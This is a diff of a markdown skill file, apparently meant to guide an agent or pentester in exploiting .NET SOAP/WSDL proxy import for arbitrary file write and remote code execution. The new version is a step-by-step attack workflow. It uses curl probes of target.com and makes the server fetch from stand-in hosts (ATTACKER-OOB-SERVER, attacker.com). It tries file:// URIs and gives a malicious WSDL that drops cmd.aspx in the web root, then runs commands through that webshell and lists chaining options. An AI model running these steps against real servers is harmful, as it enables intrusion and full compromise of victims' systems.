@@ -1,93 +1,76 @@
 ---
 name: soapwn-wsdl-rce
-description: Exploit .NET WSDL proxy (HttpWebClientProtocol) to achieve arbitrary file write and RCE via SOAP service import. Use when .NET SOAP/WCF/ASMX endpoints detected.
+description: Exploit .NET WSDL proxy (HttpWebClientProtocol) to achieve arbitrary file write and RCE via SOAP service import -- a silent type cast failure during deserialization writes fetched content to disk as .aspx/.cshtml. Use when .NET SOAP/WCF/ASMX endpoints detected.
 ---
 
-# SOAPwn — .NET WSDL Proxy RCE
+# SOAPwn -- .NET WSDL Proxy RCE
 
 ## Pattern
 - .NET application consumes external SOAP services via WSDL import
-- `HttpWebClientProtocol` or `SoapHttpClientProtocol` used to generate client proxy
+- `HttpWebClientProtocol` or `SoapHttpClientProtocol` generates client proxy
 - Application fetches WSDL from user-influenced URL
 
-## Mechanism
-1. .NET's `HttpWebClientProtocol` accepts a URL to fetch a WSDL definition
-2. Supply a `file://` URI instead of `http://`
-3. A silent type cast failure occurs during deserialization
-4. The framework writes the fetched content to disk as `.aspx` or `.cshtml`
-5. Result: arbitrary file write → webshell → RCE
+## Exploit Workflow
 
-## Detection
-Look for indicators of .NET SOAP consumption:
-
-```
-*.asmx          — ASP.NET Web Services
-*.svc           — WCF Services
-?wsdl           — WSDL endpoint suffix
-?disco          — Discovery document
-/Service1.asmx?WSDL
-```
-
-Response headers:
-```http
-X-Powered-By: ASP.NET
-X-AspNet-Version: 4.0.30319
-Server: Microsoft-IIS/10.0
-```
-
-Body indicators:
-```xml
-<wsdl:definitions xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/">
-<soap:address location="..."/>
-```
-
-## Exploit Steps
-
-### 1. Confirm WSDL endpoint
+### 1. Detect SOAP/WCF endpoints
 ```bash
-curl -x localhost:8080 -k "https://target.com/Service.asmx?WSDL"
-```
-Look for valid WSDL XML response with service definitions.
+# Probe common SOAP endpoint patterns
+curl -x localhost:8080 -k -sD- "https://target.com/Service.asmx?WSDL" | head -20
+curl -x localhost:8080 -k -sD- "https://target.com/Service.svc?wsdl" | head -20
+curl -x localhost:8080 -k -sD- "https://target.com/Service.asmx?disco" | head -20
 
-### 2. Test URL parameter influence
-Find where the application imports external WSDL:
-```http
-POST /api/import-service HTTP/1.1
-Content-Type: application/json
-
-{"wsdlUrl": "http://attacker.com/evil.wsdl"}
-```
-Or via SOAP headers:
-```xml
-<wsdl:import namespace="http://target.com/" location="http://attacker.com/evil.wsdl"/>
+# Check for .NET indicators in headers
+curl -x localhost:8080 -k -sI "https://target.com/" | rg -i "x-powered-by|x-aspnet|server.*iis"
 ```
 
-### 3. Attempt file:// protocol
-```http
-POST /api/import-service HTTP/1.1
-Content-Type: application/json
+**Checkpoint:** Must see valid WSDL XML with `<wsdl:definitions>` and .NET response headers. If no WSDL endpoint found, this technique does not apply.
 
-{"wsdlUrl": "file:///C:/inetpub/wwwroot/shell.aspx"}
+### 2. Find user-influenced WSDL URL parameter
+```bash
+# Via JSON API
+curl -x localhost:8080 -k "https://target.com/api/import-service" \
+  -H "Content-Type: application/json" \
+  -d '{"wsdlUrl": "https://ATTACKER-OOB-SERVER/canary.wsdl"}'
+
+# Via SOAP import header
+curl -x localhost:8080 -k "https://target.com/Service.asmx" \
+  -H "Content-Type: text/xml" \
+  -d '<wsdl:import namespace="http://target.com/" location="https://ATTACKER-OOB-SERVER/canary.wsdl"/>'
 ```
 
-### 4. Craft malicious WSDL
-Host a WSDL that, when processed, writes a webshell:
+**Checkpoint:** Check OOB callback -- did the server fetch your URL? If no callback, the WSDL URL is not user-influenced.
+
+### 3. Test file:// protocol
+```bash
+curl -x localhost:8080 -k "https://target.com/api/import-service" \
+  -H "Content-Type: application/json" \
+  -d '{"wsdlUrl": "file:///C:/inetpub/wwwroot/test.txt"}'
+```
+
+### 4. Craft malicious WSDL and host on attacker server
 ```xml
 <?xml version="1.0" encoding="utf-8"?>
 <wsdl:definitions xmlns:wsdl="http://schemas.xmlsoap.org/wsdl/"
   xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/">
   <wsdl:types>
     <xsd:schema>
-      <!-- Schema that triggers code generation to disk -->
+      <!-- Schema triggers code generation -- proxy class written to disk -->
     </xsd:schema>
   </wsdl:types>
-  <wsdl:service name="Evil">
-    <wsdl:port binding="tns:EvilBinding">
+  <wsdl:service name="Shell">
+    <wsdl:port binding="tns:ShellBinding">
       <soap:address location="file:///C:/inetpub/wwwroot/cmd.aspx"/>
     </wsdl:port>
   </wsdl:service>
 </wsdl:definitions>
 ```
+
+### 5. Verify write and access webshell
+```bash
+curl -x localhost:8080 -k "https://target.com/cmd.aspx?cmd=whoami"
+```
+
+**Checkpoint:** If webshell is not accessible, the write may have landed in a non-web-accessible path. Try alternative paths: `C:\inetpub\wwwroot\`, `C:\wwwroot\`, or use error messages to discover the actual web root. If .aspx execution is blocked, chain with `write-path-to-rce`.
 
 ## Prerequisites
 - Target runs .NET (IIS, ASP.NET)
@@ -95,5 +78,6 @@ Host a WSDL that, when processed, writes a webshell:
 - User can influence the WSDL URL parameter
 - `file://` protocol not blocked at network or application layer
 
-## Key Insight
-The vulnerability is in .NET's WSDL proxy generation pipeline — the silent cast failure during import means the framework doesn't validate the output path. This turns a seemingly benign "import service" feature into arbitrary file write with webshell potential.
+## Chain With
+- `write-path-to-rce` (if direct .aspx execution blocked, use framework view resolution)
+- `ssrf-redirect-loop` (if WSDL URL fetched server-side, chain with redirect for internal access)
